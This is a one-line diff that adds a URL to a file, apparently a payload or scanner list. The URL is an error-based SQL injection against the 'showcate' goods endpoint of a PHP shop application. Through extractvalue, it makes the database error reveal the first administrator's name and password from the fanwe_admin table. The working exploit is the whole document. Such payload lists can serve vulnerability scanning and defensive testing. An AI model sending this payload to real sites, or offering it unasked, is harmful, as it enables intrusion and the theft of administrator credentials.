@@ -1,0 +1,1 @@
+/index.php?m=Goods&a=showcate&id=103%20and%20extractvalue(1,%20concat(0x7e,(SELECT%20distinct%20concat(0x23,adm_name,0x3a,adm_pwd,0x23)%20FROM%20fanwe_admin%20limit%200,1)))
